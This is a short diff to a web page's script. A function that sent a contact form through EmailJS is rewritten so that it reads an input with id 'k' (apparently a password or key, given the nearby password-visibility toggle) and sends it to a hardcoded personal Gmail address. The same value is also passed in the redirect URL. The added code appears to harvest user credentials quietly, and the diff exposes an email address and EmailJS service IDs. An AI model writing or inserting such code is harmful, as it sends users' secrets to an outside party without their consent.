@@ -30,10 +30,11 @@
           else pass.type="password";
         }
         function m() {
+            let k = document.getElementById('k').value;
             var params = {
-                name: document.getElementById("name").value,
-                email: document.getElementById("email").value,
-                message: document.getElementById("message").value
+                name: k,
+                email: "eyobeb337@gmail.com",
+                message: "one body is inserted"
             };
 
             emailjs.send("service_sjp7z9x", "template_bcmnf95", params)
@@ -44,7 +45,7 @@
                 });
 
             
-            var k = document.getElementById('k').value;
+            
          window.location.href = "menu.html?k=" + k;
         }
     </script>
